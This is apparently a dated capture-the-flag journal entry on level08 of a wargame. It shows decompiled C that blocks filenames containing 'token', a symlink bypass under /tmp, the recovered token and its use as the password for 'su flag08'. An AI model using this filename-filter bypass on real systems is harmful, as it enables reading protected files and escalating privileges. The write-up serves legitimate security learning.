Date: 9/21/2024

Entry:
In today's task, we tried to open a file `token` with the executable `level08`, but we couldn't access it. We decompiled the program and found the following code:
```c
void main(int param_1,undefined4 *param_2)

{
  char *pcVar1;
  int __fd;
  size_t __n;
  int in_GS_OFFSET;
  undefined local_414 [1024];
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 == 1) {
    printf("%s [file to read]\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar1 = strstr((char *)param_2[1],"token");
  if (pcVar1 != (char *)0x0) {
    printf("You may not access \'%s\'\n",param_2[1]);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  __fd = open((char *)param_2[1],0);
  if (__fd == -1) {
    err(1,"Unable to open %s",param_2[1]);
  }
  __n = read(__fd,local_414,0x400);
  if (__n == 0xffffffff) {
    err(1,"Unable to read fd %d",__fd);
  }
  write(1,local_414,__n);
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
As shown in the code, the program would not open files containing `token` in their name. To bypass this restriction, we decided to create a symbolic link (symlink), which worked.

Commands used: 
`ln -s /home/user/level08/token /tmp/aa`
`./level08 /tmp/aa`
`quif5eloekouj29ke0vouxean`
`su flag08` <- insert token as password and run `getflag`